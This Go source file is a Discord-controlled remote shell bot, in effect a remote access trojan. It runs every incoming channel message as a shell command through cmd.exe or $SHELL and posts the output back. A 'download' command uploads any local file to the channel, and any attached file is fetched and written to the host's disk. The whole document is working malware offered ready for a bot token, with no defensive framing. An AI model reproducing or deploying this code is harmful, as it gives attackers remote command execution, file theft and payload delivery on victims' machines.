package main

import (
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/bwmarrin/discordgo"
)

const (
	token = ""
)

var (
	platform   = runtime.GOOS
	httpClient = http.DefaultClient
)

func main() {

	dc, err := discordgo.New("Bot " + token)
	if err != nil {
		panic(err)
	}

	dc.AddHandler(messageCreate)

	dc.Identify.Intents = discordgo.MakeIntent(discordgo.IntentsGuildMessages)

	if err := dc.Open(); err != nil {
		panic(err)
	}
	defer dc.Close()

	for {
	}

}

func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {

	if m.Author.ID == s.State.User.ID {
		return
	}

	mSplit := strings.SplitN(m.Content, " ", 2)
	if len(mSplit) > 1 {
		switch mSplit[0] {
		case "cd":
			temp, _ := filepath.Abs(strings.Join(mSplit[1:], " "))
			os.Chdir(temp)
			return
		case "download":
			filePath := mSplit[1]
			fileName := filepath.Base(filePath)
			file, err := os.Open(filePath)
			if err != nil {
				println(err.Error())
				return
			}
			s.ChannelFileSend(m.ChannelID, fileName, file)
			return
		}
	}

	for _, attachment := range m.Attachments {

		response, err := httpClient.Get(attachment.URL)
		if err != nil {
			continue
		}

		fileName := filepath.Base(attachment.URL)

		file, err := os.Create(fileName)
		if err != nil {
			continue
		}
		defer file.Close()

		io.Copy(file, response.Body)

	}

	output, _ := execCmd(m.Content)

	s.ChannelMessageSend(m.ChannelID, string(output))

}

func execCmd(cmdInp string) ([]byte, error) {

	var cmd *exec.Cmd

	if platform == "windows" {
		cmd = exec.Command("cmd.exe", "/c", cmdInp)
	} else {
		cmd = exec.Command(os.Getenv("SHELL"), "-c", cmdInp)
	}

	return cmd.Output()
}
